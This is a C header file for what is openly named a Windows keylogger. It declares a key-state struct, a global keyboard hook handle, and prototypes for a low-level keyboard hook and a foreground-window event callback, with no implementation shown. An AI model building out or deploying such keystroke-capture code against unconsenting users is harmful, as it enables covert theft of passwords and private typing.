#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include "logs.h"

#include <windows.h>
#include <stdio.h>


#define _WIN32_WINNT 0x0A00

typedef struct s_key {
	BOOL keyStates[256];
	BOOL isCapsLockOn;
	DWORD keyPressTime[256];
	DWORD lastRepeatTime[256];

	DWORD currentTime;

	DWORD repeatDelay;
	DWORD repeatSpeed;
	DWORD delayMs;
	DWORD intervalMs;
}	t_key;


HHOOK hKeyboardHook;


int	    handleKeyPress(t_key *keyData);
void	initKeylogger(t_key *keyData);

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

void CALLBACK WinForeground(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
	DWORD event, // Event type
	HWND hwnd, // Handle to the window that generated the event
	LONG idObject,	 // Object identifier
	LONG idChild, // Child identifier
	DWORD dwEventThread, // Thread identifier of the thread that generated the event
	DWORD dwmsEventTime); // Time of the event in milliseconds since the system started

#endif